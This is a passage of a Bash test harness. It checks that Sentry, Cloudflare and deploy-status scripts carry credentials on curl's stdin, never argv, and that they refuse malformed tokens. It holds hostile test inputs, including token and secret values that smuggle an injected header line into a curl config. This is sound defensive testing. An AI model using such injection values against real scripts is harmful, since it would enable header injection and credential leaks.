# positive control: the extractor really returns a followthrough row from a synthetic baseline (an empty overlap cannot be a broken extractor)
printf '# header\nscripts/followthroughs/synthetic-probe-0001.sh\t2\nscripts/other/not-a-probe.sh\t1\n' > "$TMPD/synthetic-baseline-e.txt"
SYN_BE="$(be_followthrough_rows "$TMPD/synthetic-baseline-e.txt")"
if [[ "$SYN_BE" == "synthetic-probe-0001" ]]; then row "population control: the baseline-E extractor returns the followthrough row of a synthetic baseline and ignores a non-followthrough row" ok
else row "population control: the baseline-E extractor returns the followthrough row of a synthetic baseline and ignores a non-followthrough row" fail "extracted='${SYN_BE//$'\n'/,}'"; fi
# the disjointness check can fire: a synthetic overlap (a bearer-converted probe listed in a synthetic baseline) is reported
SYN_FIRST="$(printf '%s\n' "$BEARER_CONVERTED" | head -n1)"
SYN_OV="$(comm -12 <(printf '%s\n' "$SYN_FIRST") <(printf '%s\n' "$BEARER_CONVERTED") | grep . || true)"
if [[ -n "$SYN_FIRST" && "$SYN_OV" == "$SYN_FIRST" ]]; then row "population control: the overlap comparison reports a converted probe that is listed (it can fire)" ok
else row "population control: the overlap comparison reports a converted probe that is listed (it can fire)" fail "overlap='$SYN_OV'"; fi
# ...and for an HMAC-manifest probe specifically (the case the converted set used to exclude): a synthetic baseline that lists the
# first HMAC probe is extracted and reported as the overlap.
SYN_HM_FIRST="$(printf '%s\n' "$HMAC_MANIFEST" | cut -d'|' -f1 | head -n1)"
printf '# header\nscripts/followthroughs/%s.sh\t2\n' "$SYN_HM_FIRST" > "$TMPD/synthetic-baseline-e-hmac.txt"
SYN_HM_OV="$(comm -12 <(be_followthrough_rows "$TMPD/synthetic-baseline-e-hmac.txt") <(printf '%s\n' "$BEARER_CONVERTED") | grep . || true)"
if [[ -n "$SYN_HM_FIRST" && "$SYN_HM_OV" == "$SYN_HM_FIRST" ]]; then row "population control: an HMAC probe re-added to baseline E is reported by the disjointness comparison (the HMAC manifest is part of the converted set)" ok
else row "population control: an HMAC probe re-added to baseline E is reported by the disjointness comparison (the HMAC manifest is part of the converted set)" fail "hmac-first='$SYN_HM_FIRST' overlap='$SYN_HM_OV'"; fi

# --- DYNAMIC rows ----------------------------------------------------------------------------
N_DYN=0
probe_rows() { # name tokvar hosts min body
  local name="$1" tokvar="$2" hosts="$3" min="$4" body="$5"
  local rel="scripts/followthroughs/$name.sh" script="$REPO_ROOT/scripts/followthroughs/$name.sh" rc
  N_DYN=$((N_DYN + 1))
  if [[ ! -f "$script" ]]; then row "$name: manifest entry names an existing probe" fail "$rel is missing"; return 0; fi
  local -a okenv=("$tokvar=$FIXTURE_TOKEN" "SHIM_BODY_FILE=$BODIES/$body.json")

  # A. the full contract
  run_probe "$name-A" "$script" "${okenv[@]}"
  rc=$RUN_RC; evaluate "$RUN_ROW" "$hosts" "$min" "$FIXTURE_TOKEN"
  local outcome_ok=0; [[ "$rc" -eq 0 ]] && grep -q '^PASS' "$RUN_ROW/stdout" && outcome_ok=1
  if [[ "$outcome_ok" -eq 1 && -z "$EV_FAILED" ]]; then
    row "$name: full contract (every call to the manifest hosts has the bearer on stdin, token in no argv, >= $min call(s))" ok
  else row "$name: full contract (every call to the manifest hosts has the bearer on stdin, token in no argv, >= $min call(s))" fail "rc=$rc calls=$EV_HOST_CALLS failed='$EV_FAILED'"; fi

  # B. a 401 must never reach the PASS outcome
  run_probe "$name-B" "$script" "${okenv[@]}" SHIM_MODE=deny
  if transient_outcome "$RUN_ROW" "$RUN_RC" && [[ ! -e "$RUN_ROW/shim/unexpected" && ! -e "$RUN_ROW/shim/unmodelled" ]]; then
    row "$name: a 401 never reaches PASS (rc 2, TRANSIENT on stderr)" ok
  else row "$name: a 401 never reaches PASS (rc 2, TRANSIENT on stderr)" fail "rc=$RUN_RC"; fi

  # C. header stripped by a mutated COPY of the real probe
  local cdir="$ROWS/$name-C-copy"; assert_fixture_dir "$cdir"; mkdir -p "$cdir"
  sed 's/Authorization: Bearer/X-Stripped: Bearer/g' "$script" > "$cdir/$name.sh"
  if ! grep -q 'X-Stripped' "$cdir/$name.sh"; then row "$name: header-stripped copy" fail "the sed did not land; the probe has no 'Authorization: Bearer' text"
  else
    run_probe "$name-C" "$cdir/$name.sh" "${okenv[@]}"
    if transient_outcome "$RUN_ROW" "$RUN_RC"; then row "$name: a header-stripped copy never reaches PASS (rc 2, TRANSIENT on stderr)" ok
    else row "$name: a header-stripped copy never reaches PASS (rc 2, TRANSIENT on stderr)" fail "rc=$RUN_RC"; fi
  fi

  # D. unset and empty token: zero calls, TRANSIENT rc 2
  local cls d_ok=1 d_detail=""
  for cls in unset empty; do
    shape_check "$script" "$tokvar" "$cls" "$name-D-$cls" "SHIM_BODY_FILE=$BODIES/$body.json" || { d_ok=0; d_detail+=" [$cls: $SHAPE_DETAIL]"; }
  done
  if [[ "$d_ok" -eq 1 ]]; then row "$name: an unset or empty token produces zero calls and a TRANSIENT rc 2" ok
  else row "$name: an unset or empty token produces zero calls and a TRANSIENT rc 2" fail "$d_detail"; fi

  # CONVERTED-ONLY rows: they assert properties a conversion adds, so they switch on when the
  # probe leaves baseline E (rows only grow; EXPECTED_TESTS is a lower bound).

  # E1. hostile token shapes
  local e_ok=1 e_detail=""
  for cls in $TOK_CLASSES; do
    shape_check "$script" "$tokvar" "$cls" "$name-E1-$cls" "SHIM_BODY_FILE=$BODIES/$body.json" || { e_ok=0; e_detail+=" [$cls: $SHAPE_DETAIL]"; }
  done
  if [[ "$e_ok" -eq 1 ]]; then row "$name: hostile tokens (quote+newline+url, newline-only, non-ASCII, quote, space, backslash, tab, CR) produce zero calls, TRANSIENT rc 2, no INJECTED, token not echoed" ok
  else row "$name: hostile tokens (quote+newline+url, newline-only, non-ASCII, quote, space, backslash, tab, CR) produce zero calls, TRANSIENT rc 2, no INJECTED, token not echoed" fail "$e_detail"; fi
  # E2/E3. xtrace refusal
  for mode in env flag; do
    if xtrace_check "$script" "$tokvar" "$name-E-xtrace-$mode" "$mode"; then row "$name: refuses xtrace ($mode form): rc 78, zero calls, no token on output" ok
    else row "$name: refuses xtrace ($mode form): rc 78, zero calls, no token on output" fail "$XT_DETAIL"; fi
  done
  # E4. 100,000-byte token, never-reading shim, pipefail: a converted probe is unaffected
  run_probe "$name-E4" "$script" "$tokvar=$BIGTOK" "SHIM_BODY_FILE=$BODIES/$body.json" SHIM_MODE=noread
  # A 64-byte PREFIX stands in for the 100 KB token in the greps: `grep -F` with a 100,000-byte
  # pattern is pathologically slow (measured: minutes), and the token being in argv implies its
  # prefix is.
  rc=$RUN_RC; evaluate "$RUN_ROW" "$hosts" 0 "${BIGTOK:0:64}"
  if [[ "$rc" -eq 0 ]] && grep -q '^PASS' "$RUN_ROW/stdout" && ! has_check token-in-argv; then
    row "$name: a 100,000-byte token with a never-reading shim under pipefail: rc 0 (no pipe-form SIGPIPE), token in no argv" ok
  else row "$name: a 100,000-byte token with a never-reading shim under pipefail: rc 0 (no pipe-form SIGPIPE), token in no argv" fail "rc=$rc failed='$EV_FAILED'"; fi
  # E5/E6. harness mutations against the real converted probe: RED for every row
  run_probe "$name-E5" "$script" "${okenv[@]}" SHIM_MUTATE=nostdin
  evaluate "$RUN_ROW" "$hosts" "$min" "$FIXTURE_TOKEN"
  if has_check bearer-not-on-stdin; then row "$name: a shim that stops recording stdin turns this row RED" ok
  else row "$name: a shim that stops recording stdin turns this row RED" fail "failed='$EV_FAILED'"; fi
  run_probe "$name-E6" "$cdir/$name.sh" "${okenv[@]}" SHIM_MUTATE=noauth
  if transient_outcome "$RUN_ROW" "$RUN_RC"; then row "$name: a shim that stops being auth-gated lets the stripped copy reach PASS, and the check sees it" fail "stripped copy still TRANSIENT"
  else row "$name: a shim that stops being auth-gated lets the stripped copy reach PASS, and the check sees it" ok; fi
}
while IFS='|' read -r m_name m_tokvar m_hosts m_min m_body; do
  [[ -n "$m_name" ]] || continue
  probe_rows "$m_name" "$m_tokvar" "$m_hosts" "$m_min" "$m_body"
done <<< "$DYN_MANIFEST"

# --- STATIC-ONLY rows -----------------------------------------------------------------------
N_STATIC=0
while IFS='|' read -r s_name s_kind s_arg s_why; do
  [[ -n "$s_name" ]] || continue
  N_STATIC=$((N_STATIC + 1))
  s_script="$REPO_ROOT/scripts/followthroughs/$s_name.sh"
  if [[ ! -f "$s_script" ]]; then row "static-only $s_name: names an existing probe" fail "missing"; continue; fi
  case "$s_kind" in
    placeholder)
      run_probe "$s_name-S" "$s_script" "SENTRY_ACTIONS_RO_TOKEN=$FIXTURE_TOKEN"
      count_calls "$RUN_ROW"
      if grep -qF -- "$s_arg" "$s_script" && [[ "$EV_CALLS" -eq 0 && "$RUN_RC" -eq 2 ]]; then
        row "static-only $s_name: still unreachable (placeholder $s_arg, rc 2, zero calls) -- $s_why" ok
      else row "static-only $s_name: still unreachable (placeholder $s_arg, rc 2, zero calls)" fail "rc=$RUN_RC calls=$EV_CALLS: the probe is now hermetically reachable; move it to the dynamic manifest" ; fi ;;
    fixed-tmp)
      if grep -qF -- "$s_arg" "$s_script"; then row "static-only $s_name: still writes the fixed path $s_arg -- $s_why" ok
      else row "static-only $s_name: still writes the fixed path $s_arg" fail "the fixed path is gone: the probe is now hermetically reachable; move it to the dynamic manifest"; fi ;;
    gh-chained)
      # `grep -q` over a PROCESS SUBSTITUTION, not a pipe: under pipefail the early-exiting -q
      # SIGPIPEs the upstream grep on a large file and reads as "no match" (measured on zot-soak).
      if grep -qE '(^|[^[:alnum:]_-])gh (issue|pr|api)' < <(grep -vE '^[[:space:]]*#' "$s_script"); then row "static-only $s_name: still chained behind gh -- $s_why" ok
      else row "static-only $s_name: still chained behind gh" fail "no gh issue/pr/api call remains: the probe is now hermetically reachable; move it to the dynamic manifest"; fi ;;
    bs-chained)
      if grep -qF -- "$s_arg" < <(grep -vE '^[[:space:]]*#' "$s_script"); then row "static-only $s_name: still chained into $s_arg -- $s_why" ok
      else row "static-only $s_name: still chained into $s_arg" fail "the chain is gone: the probe is now hermetically reachable; move it to the dynamic manifest"; fi ;;
    *) row "static-only $s_name: known kind" fail "unknown kind '$s_kind'" ;;
  esac
done <<< "$STATIC_MANIFEST"

# --- DELEGATED rows -------------------------------------------------------------------------
N_DELEGATED=0
while IFS='|' read -r d_name d_test; do
  [[ -n "$d_name" ]] || continue
  N_DELEGATED=$((N_DELEGATED + 1))
  if [[ -f "$d_test" ]] && git ls-files --error-unmatch -- "$d_test" >/dev/null 2>&1 && grep -qF -- "$d_name" "$d_test"; then
    row "delegated $d_name: owning test $d_test exists, is tracked and names the probe" ok
  else row "delegated $d_name: owning test $d_test exists, is tracked and names the probe" fail "the owning test is missing, untracked or no longer names the probe"; fi
done <<< "$DELEGATED_MANIFEST"

echo "=== manifest: $N_DYN dynamic, $N_STATIC static-only, $N_DELEGATED delegated; population $(printf '%s\n' "$POP" | grep -c . || true) ==="

# =====================================================================================
# STAGE 3: THE LIVE-IN-APPLY INFRA SCRIPTS (#9597). Two scripts run by the push-triggered
# infra apply carried a bearer on curl's argv; the changed transport is proven HERE, before
# merge, by running each under the PATH-shim curl:
#   fresh-host-boot-trail.sh   two Sentry reads (org events query + polled project read)
#   verify-tunnel-ingress-origin.sh  two calls: the Cloudflare config read (Bearer) and the
#                              deploy-status read (webhook HMAC + CF Access id/secret headers)
# A failure of the second blocks the apply, so its refusal path is exercised too.
# =====================================================================================
INFRA_SCRIPTS="$REPO_ROOT/apps/web-platform/infra/scripts"
FHBT="$INFRA_SCRIPTS/fresh-host-boot-trail.sh"
VTIO="$INFRA_SCRIPTS/verify-tunnel-ingress-origin.sh"
[[ -f "$FHBT" && -f "$VTIO" ]] || fatal "stage 3: the live-in-apply scripts are missing ($FHBT, $VTIO)"
printf '%s' '[]' > "$BODIES/empty_array.json"
printf '%s' '{"data":[{"timestamp":"2026-10-01T00:00:00+00:00","stage":"app_zot","host_name":"soleur-web-9","detail":"synthetic"}]}' > "$BODIES/origin_event.json"
printf '%s' '{"success":true,"result":{"config":{"ingress":[{"hostname":"deploy.soleur.example","service":"http://10.0.1.10:9000"},{"hostname":"ssh.soleur.example","service":"ssh://10.0.1.10:22"},{"service":"http_status:404"}]}}}' > "$BODIES/cf_tunnel_cfg.json"

# mutated_copy <script> <outfile> <from-literal> <to-literal>: a copy with ONE literal replaced;
# FATAL if the literal is absent (a mutation that does not land reports the baseline, which is
# indistinguishable from a pass).
mutated_copy() {
  local src="$1" out="$2" from="$3" to="$4" text
  text="$(cat "$src"; printf x)"; text="${text%x}"
  [[ "$text" == *"$from"* ]] || fatal "mutation did not land: '${from:0:60}...' not found in $src"
  assert_fixture_dir "$out"
  printf '%s' "${text/"$from"/"$to"}" > "$out"
}
assert_fixture_dir "$SYN"
BEARER_FN='_bearer_ok() { local LC_ALL=C; case "${1:-}" in '"''"'|*[!A-Za-z0-9._~+/=-]*) return 1 ;; esac; }'

# --- fresh-host-boot-trail.sh ------------------------------------------------------------------
trail_env() { # <rowname> -> prints NAME=value args for run_probe (summary file lives in the row dir)
  printf '%s\n' "GITHUB_STEP_SUMMARY=$ROWS/$1/summary" "WEB_HOST_KEY=web-9" "JOB_STATUS=failure" "BOOT_TRAIL_SINCE=0" "SHIM_BODY_FILE=$BODIES/empty_array.json"
}
mkdir -p "$ROWS/t1-origin" "$ROWS/t2-main"
RUN_ARGS=(--image-origin web-9)
run_probe t1-origin "$FHBT" "SENTRY_ACTIONS_RO_TOKEN=$FIXTURE_TOKEN" "SHIM_BODY_FILE=$BODIES/origin_event.json" "BOOT_TRAIL_SINCE=0"
RUN_ARGS=()
rc=$RUN_RC; evaluate "$RUN_ROW" 'de\.sentry\.io' 2 "$FIXTURE_TOKEN"
if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -qF 'image-origin: stage=app_zot' "$RUN_ROW/stdout"; then
  row "fresh-host-boot-trail --image-origin: both Sentry org reads carry the bearer on stdin only (>= 2 calls), token in no argv" ok
else row "fresh-host-boot-trail --image-origin: both Sentry org reads carry the bearer on stdin only (>= 2 calls), token in no argv" fail "rc=$rc failed='$EV_FAILED'"; fi

mapfile -t _t2env < <(trail_env t2-main)
run_probe t2-main "$FHBT" "SENTRY_ACTIONS_RO_TOKEN=$FIXTURE_TOKEN" "${_t2env[@]}"
rc=$RUN_RC; evaluate "$RUN_ROW" 'de\.sentry\.io' 2 "$FIXTURE_TOKEN"
if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]]; then
  row "fresh-host-boot-trail main flow: the polled project read AND the image-origin read carry the bearer on stdin only (>= 2 calls)" ok
else row "fresh-host-boot-trail main flow: the polled project read AND the image-origin read carry the bearer on stdin only (>= 2 calls)" fail "rc=$rc failed='$EV_FAILED'"; fi
if ! grep -qF '/tmp/sentry-events.json' "$FHBT"; then row "fresh-host-boot-trail: no fixed /tmp/sentry-events.json path remains (script-owned mktemp)" ok
else row "fresh-host-boot-trail: no fixed /tmp/sentry-events.json path remains (script-owned mktemp)" fail "the fixed path is back"; fi

# hostile token classes: zero calls, the skip is NAMED, the token is never echoed.
ft_ok=1; ft_detail=""
for cls in $TOK_CLASSES; do
  mkdir -p "$ROWS/t3-main-$cls" "$ROWS/t3-origin-$cls"
  mapfile -t _e < <(trail_env "t3-main-$cls"); _e=("${_e[@]/JOB_STATUS=failure/JOB_STATUS=success}")
  run_probe "t3-main-$cls" "$FHBT" "SENTRY_ACTIONS_RO_TOKEN=$(tok_for "$cls")" "${_e[@]}"
  count_calls "$RUN_ROW"
  { [[ "$RUN_RC" -eq 0 && "$EV_CALLS" -eq 0 ]] && grep -aqF 'failed the token-shape check' "$RUN_ROW/stdout" && ! grep -aq 'SYNTHMARK000' "$RUN_ROW/stdout" "$RUN_ROW/stderr" "$RUN_ROW/summary"; } \
    || { ft_ok=0; ft_detail+=" [main/$cls rc=$RUN_RC calls=$EV_CALLS]"; }
  mapfile -t _e < <(trail_env "t3-origin-$cls")
  RUN_ARGS=(--image-origin web-9)
  run_probe "t3-origin-$cls" "$FHBT" "SENTRY_ACTIONS_RO_TOKEN=$(tok_for "$cls")" "${_e[@]}"
  RUN_ARGS=()
  count_calls "$RUN_ROW"
  { [[ "$RUN_RC" -eq 2 && "$EV_CALLS" -eq 0 ]] && grep -aqF 'TRANSIENT' "$RUN_ROW/stdout" && ! grep -aq 'SYNTHMARK000' "$RUN_ROW/stdout" "$RUN_ROW/stderr"; } \
    || { ft_ok=0; ft_detail+=" [origin/$cls rc=$RUN_RC calls=$EV_CALLS]"; }
done
if [[ "$ft_ok" -eq 1 ]]; then row "fresh-host-boot-trail: hostile tokens (quote+newline+url, newline, non-ASCII, quote, space, backslash, tab, CR) make zero calls, name the skip (main: exit 0; --image-origin: TRANSIENT rc 2), never echo the token" ok
else row "fresh-host-boot-trail: hostile tokens (quote+newline+url, newline, non-ASCII, quote, space, backslash, tab, CR) make zero calls, name the skip (main: exit 0; --image-origin: TRANSIENT rc 2), never echo the token" fail "$ft_detail"; fi
for mode in env flag; do
  if xtrace_check "$FHBT" SENTRY_ACTIONS_RO_TOKEN "t4-$mode" "$mode"; then row "fresh-host-boot-trail: refuses xtrace ($mode form): rc 78, zero calls, no token on output" ok
  else row "fresh-host-boot-trail: refuses xtrace ($mode form): rc 78, zero calls, no token on output" fail "$XT_DETAIL"; fi
done
# harness + code mutations against the real script
mapfile -t _e < <(trail_env t5-nostdin)
run_probe t5-nostdin "$FHBT" "SENTRY_ACTIONS_RO_TOKEN=$FIXTURE_TOKEN" "${_e[@]}" SHIM_MUTATE=nostdin
evaluate "$RUN_ROW" 'de\.sentry\.io' 2 "$FIXTURE_TOKEN"
if has_check bearer-not-on-stdin; then row "fresh-host-boot-trail: a shim that stops recording stdin turns the row RED" ok
else row "fresh-host-boot-trail: a shim that stops recording stdin turns the row RED" fail "failed='$EV_FAILED'"; fi
FROM_PS='< <(printf '"'"'header = "Authorization: Bearer %s"\n'"'"' "$SENTRY_ACTIONS_RO_TOKEN")'
mutated_copy "$FHBT" "$SYN/fhbt-argv.sh" "$FROM_PS" '-H "Authorization: Bearer $SENTRY_ACTIONS_RO_TOKEN"'
mapfile -t _e < <(trail_env t6-argv)
run_probe t6-argv "$SYN/fhbt-argv.sh" "SENTRY_ACTIONS_RO_TOKEN=$FIXTURE_TOKEN" "${_e[@]}"
evaluate "$RUN_ROW" 'de\.sentry\.io' 1 "$FIXTURE_TOKEN"
if has_check token-in-argv; then row "fresh-host-boot-trail: restoring the argv bearer on either read is RED on token-in-argv" ok
else row "fresh-host-boot-trail: restoring the argv bearer on either read is RED on token-in-argv" fail "failed='$EV_FAILED'"; fi
mutated_copy "$FHBT" "$SYN/fhbt-noguard.sh" "$BEARER_FN" '_bearer_ok() { return 0; }'
mapfile -t _e < <(trail_env t7-noguard)
run_probe t7-noguard "$SYN/fhbt-noguard.sh" "SENTRY_ACTIONS_RO_TOKEN=$(tok_for quote-newline-url)" "${_e[@]}"
evaluate "$RUN_ROW" 'de\.sentry\.io' 1 "SYNTHMARK0001"
if has_check injected; then row "fresh-host-boot-trail: removing the token-shape guard is RED on injected (the shim records the injected config line)" ok
else row "fresh-host-boot-trail: removing the token-shape guard is RED on injected (the shim records the injected config line)" fail "failed='$EV_FAILED'"; fi

# --- verify-tunnel-ingress-origin.sh ----------------------------------------------------------
VT_STUBS="$TMPD/vt-stubs"; assert_fixture_dir "$VT_STUBS"; mkdir -p "$VT_STUBS"
# S4: the script signs with the canonical python3 snippet (the key rides python3's environment, not openssl's argv), so the
# stub dir needs the real python3 beside the stubs. Without it the HMAC is empty and the shape guard refuses (a correct refusal).
ln -s "$(type -P python3)" "$VT_STUBS/python3" || fatal "stage 3: no python3 to link into the verify-tunnel stub dir"
cat > "$VT_STUBS/doppler" <<'VT_DOPPLER'
#!/usr/bin/env bash
set -u
case "${1:-}" in
  run) printf '"10.0.1.10"\n' ;;
  secrets)
    case "${3:-}" in
      CF_API_TOKEN) printf '%s' "${VT_CF_API_TOKEN:-}" ;;
      CF_ACCOUNT_ID) printf 'acct0001' ;;
      APP_DOMAIN_BASE) printf 'soleur.example' ;;
      WEBHOOK_DEPLOY_SECRET) printf 'webhook-secret-0001' ;;
      CF_ACCESS_CLIENT_ID) printf '%s' "${VT_CF_ACCESS_ID:-cfid0001}" ;;
      CF_ACCESS_CLIENT_SECRET) printf '%s' "${VT_CF_ACCESS_SECRET:-cfsecret0001}" ;;
      *) exit 1 ;;
    esac ;;
  *) exit 1 ;;
esac
VT_DOPPLER
cat > "$VT_STUBS/terraform" <<'VT_TERRAFORM'
#!/usr/bin/env bash
case "${1:-} ${2:-}" in
  "state show") printf '    id = "11111111-2222-3333-4444-555555555555"\n' ;;
  *) exit 1 ;;
esac
VT_TERRAFORM
sed -i "1s|.*|#!${BASH_BIN}|" "$VT_STUBS/doppler" "$VT_STUBS/terraform"
chmod +x "$VT_STUBS/doppler" "$VT_STUBS/terraform"
vt_run() { # <rowname> <script> [env...] -- runs under the stub set; CF token defaults to the fixture
  local name="$1" script="$2"; shift 2
  RUN_EXTRA_PATH="$VT_STUBS"
  run_probe "$name" "$script" "VT_CF_API_TOKEN=$FIXTURE_TOKEN" "SHIM_BODY_FILE=$BODIES/cf_tunnel_cfg.json" SHIM_MODE=noauth "$@"
  RUN_EXTRA_PATH=""
}
vt_stdin() { cat "$ROWS/$1/shim/calls/$2.stdin" 2>/dev/null; }
# The script echoes `::add-mask::<secret>` on purpose (that is how the runner learns to mask it), so
# "never echoed" means: not on stderr, and not on any ::error:: / ::warning:: annotation line.
vt_leaks() { # <rowdir> <marker> -> 0 when the marker leaks outside ::add-mask::
  local ann; ann="$(grep -aE '^::(error|warning|notice)::' "$1/stdout" "$1/stderr" || true)"
  [[ "$ann" == *"$2"* ]] || grep -aqF -- "$2" "$1/stderr"
}
vt_argv_has() { local f; for f in "$ROWS/$1"/shim/calls/*.argv; do [[ -e "$f" ]] && grep -aqF -- "$2" "$f" && return 0; done; return 1; }

vt_run v1-ok "$VTIO"
v_rc=$RUN_RC; count_calls "$RUN_ROW"
v_hmac="$(printf '' | openssl dgst -sha256 -hmac webhook-secret-0001 | sed 's/.*= //')"
v_s1="$(vt_stdin v1-ok 1)"; v_s2="$(vt_stdin v1-ok 2)"
v_want2="$(printf 'header = "X-Signature-256: sha256=%s"\nheader = "CF-Access-Client-Id: cfid0001"\nheader = "CF-Access-Client-Secret: cfsecret0001"' "$v_hmac")"
v_bad=""
[[ "$v_rc" -eq 0 && "$EV_CALLS" -eq 2 ]] || v_bad+=" rc=$v_rc calls=$EV_CALLS"
[[ "$v_s1" == "header = \"Authorization: Bearer $FIXTURE_TOKEN\"" ]] || v_bad+=" call1-stdin"
[[ "$v_s2" == "$v_want2" ]] || v_bad+=" call2-stdin"
for needle in "$FIXTURE_TOKEN" cfid0001 cfsecret0001 "$v_hmac" webhook-secret-0001; do vt_argv_has v1-ok "$needle" && v_bad+=" argv-has-credential"; done
for f in "$ROWS"/v1-ok/shim/calls/*.injected; do [[ -s "$f" ]] && v_bad+=" injected"; done
[[ ! -e "$ROWS/v1-ok/shim/unexpected" && ! -e "$ROWS/v1-ok/shim/unmodelled" ]] || v_bad+=" stub-called"
if [[ -z "$v_bad" ]]; then row "verify-tunnel-ingress-origin: the Cloudflare read carries the bearer on stdin; the deploy-status read carries the HMAC + CF Access id + CF Access secret as three stdin headers in order; no credential in any argv" ok
else row "verify-tunnel-ingress-origin: the Cloudflare read carries the bearer on stdin; the deploy-status read carries the HMAC + CF Access id + CF Access secret as three stdin headers in order; no credential in any argv" fail "$v_bad"; fi

# unusable CF API token: gate failure (exit 1), zero calls, token never echoed
vt_ok=1; vt_detail=""
for cls in $TOK_CLASSES; do
  vt_run "v2-$cls" "$VTIO" "VT_CF_API_TOKEN=$(tok_for "$cls")"
  count_calls "$RUN_ROW"
  { [[ "$RUN_RC" -eq 1 && "$EV_CALLS" -eq 0 ]] && grep -aqF 'CF_API_TOKEN failed the token-shape check' "$RUN_ROW/stdout" "$RUN_ROW/stderr" && ! vt_leaks "$RUN_ROW" 'SYNTHMARK000'; } \
    || { vt_ok=0; vt_detail+=" [$cls rc=$RUN_RC calls=$EV_CALLS]"; }
done
if [[ "$vt_ok" -eq 1 ]]; then row "verify-tunnel-ingress-origin: a malformed CF API token is a gate failure (exit 1) with zero calls and is never echoed" ok
else row "verify-tunnel-ingress-origin: a malformed CF API token is a gate failure (exit 1) with zero calls and is never echoed" fail "$vt_detail"; fi
# unusable CF Access secret: the config read may run, the deploy-status call must NOT, and it is a gate failure
vt_ok=1; vt_detail=""
v3_i=0
for sec in 'SYNTHMARK0001"x' $'SYNTHMARK0001\nheader = "X-Injected: 1"' 'SYNTHMARK0001\x'; do
  v3_i=$((v3_i + 1))
  vt_run "v3-secret-$v3_i" "$VTIO" "VT_CF_ACCESS_SECRET=$sec"
  count_calls "$RUN_ROW"
  { [[ "$RUN_RC" -eq 1 && "$EV_CALLS" -eq 1 ]] && grep -aqF 'header-value check' "$RUN_ROW/stdout" "$RUN_ROW/stderr" && ! vt_leaks "$RUN_ROW" 'SYNTHMARK000'; } \
    || { vt_ok=0; vt_detail+=" [rc=$RUN_RC calls=$EV_CALLS]"; }
done
if [[ "$vt_ok" -eq 1 ]]; then row "verify-tunnel-ingress-origin: a CF Access secret carrying a quote, backslash or injected newline stops BEFORE the deploy-status call (exit 1) and is never echoed" ok
else row "verify-tunnel-ingress-origin: a CF Access secret carrying a quote, backslash or injected newline stops BEFORE the deploy-status call (exit 1) and is never echoed" fail "$vt_detail"; fi
for mode in env flag; do
  RUN_EXTRA_PATH="$VT_STUBS"
  if xtrace_check "$VTIO" CF_API_TOKEN "v4-$mode" "$mode"; then row "verify-tunnel-ingress-origin: refuses xtrace ($mode form): rc 78, zero calls, no token on output" ok
  else row "verify-tunnel-ingress-origin: refuses xtrace ($mode form): rc 78, zero calls, no token on output" fail "$XT_DETAIL"; fi
  RUN_EXTRA_PATH=""
done
# mutations: argv restored on the second call; guards removed
mutated_copy "$VTIO" "$SYN/vtio-argv.sh" '< <(printf '"'"'header = "X-Signature-256: sha256=%s"\nheader = "CF-Access-Client-Id: %s"\nheader = "CF-Access-Client-Secret: %s"\n'"'"' \
          "$HMAC" "$CF_ACCESS_ID" "$CF_ACCESS_SECRET")' '-H "CF-Access-Client-Secret: ${CF_ACCESS_SECRET}"'
vt_run v5-argv "$SYN/vtio-argv.sh"
if vt_argv_has v5-argv cfsecret0001; then row "verify-tunnel-ingress-origin: restoring a CF Access header on argv is RED (the credential shows in a recorded argv)" ok
else row "verify-tunnel-ingress-origin: restoring a CF Access header on argv is RED (the credential shows in a recorded argv)" fail "the mutant's credential did not reach argv"; fi
mutated_copy "$VTIO" "$SYN/vtio-noguard.sh" '_cfg_ok() { local LC_ALL=C; case "${1:-}" in '"''"'|*'"'"'"'"'"'*|*'"'"'\'"'"'*|*[[:cntrl:]]*) return 1 ;; esac; }' '_cfg_ok() { return 0; }'
vt_run v6-noguard "$SYN/vtio-noguard.sh" 'VT_CF_ACCESS_SECRET=SYNTHMARK0001"x'
v6_inj=0; for f in "$ROWS"/v6-noguard/shim/calls/*.injected; do [[ -s "$f" ]] && v6_inj=1; done
if [[ "$v6_inj" -eq 1 ]]; then row "verify-tunnel-ingress-origin: removing the header-value guard is RED (the shim records the injected config line)" ok
else row "verify-tunnel-ingress-origin: removing the header-value guard is RED (the shim records the injected config line)" fail "no INJECTED recorded for the unguarded mutant"; fi
echo "=== stage 3: fresh-host-boot-trail + verify-tunnel-ingress-origin transport rows done ==="

# =====================================================================================
# STAGE 4: SHIM EXTENSIONS for the community-script conversions (#9597, S1 Phase 2). Each
# extension is proven on SYNTHETIC probes first, so a shim that accepts too much cannot make
# the later per-script rows (plugins/soleur/skills/community/test/community-argv.test.sh)
# vacuous:
#   (a) the shim and `evaluate` are parameterised by auth SCHEME (Discord sends `Bot`, and
#       rejects `Bearer`): a Bot-to-Bearer mutation must go RED;
#   (b) the shim records a `--data-binary @-` stdin body, models `-d @-` stripping CR/LF as real
#       curl does, and has a `fail7` transport-failure mode, calibrated against real curl;
#   (c) a `jq` shim records jq's argv (jq's own argv is world-readable too);
#   (d) static rows over the converted sources and docs.
# =====================================================================================
# C4: the real-curl oracle for the body semantics and the transport-failure exit code.
CR_FILE="$ORA/crlf.txt"
printf 'SYNTHA\r\nSYNTHB\n' > "$CR_FILE"
"$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$ORA/bin.c" --data-binary @- http://127.0.0.1:9/ < "$CR_FILE" >/dev/null 2>&1; REAL_RC7=$?
"$REAL_CURL" --disable --noproxy '*' -sS --max-time 3 --libcurl "$ORA/d.c" -d @- http://127.0.0.1:9/ < "$CR_FILE" >/dev/null 2>&1 || true
[[ -s "$ORA/bin.c" && -s "$ORA/d.c" ]] || fatal "C4 real curl did not write --libcurl output for a stdin body"
grep -qF 'SYNTHA\r\nSYNTHB\n' "$ORA/bin.c" || fatal "C4 oracle: --data-binary @- did not keep CR/LF"
grep -qF 'SYNTHASYNTHB' "$ORA/d.c" || fatal "C4 oracle: -d @- did not strip CR/LF"
[[ "$REAL_RC7" -eq 7 ]] || fatal "C4 oracle: real curl against a refused connection exited $REAL_RC7, the shim's fail7 models 7"
row "control C4: real curl keeps CR/LF for --data-binary @-, strips them for -d @-, and exits 7 on a refused connection" ok

# (a) scheme rows ----------------------------------------------------------------------
P_BOT="$(make_synth bot)"
run_probe s1-bot "$P_BOT" "SYNTH_TOKEN=$FIXTURE_TOKEN" SHIM_SCHEME=Bot
rc=$RUN_RC; evaluate "$RUN_ROW" "$SYN_HOST" 1 "$FIXTURE_TOKEN" Bot
if [[ "$rc" -eq 0 && -z "$EV_FAILED" ]] && grep -q '^PASS' "$RUN_ROW/stdout" \
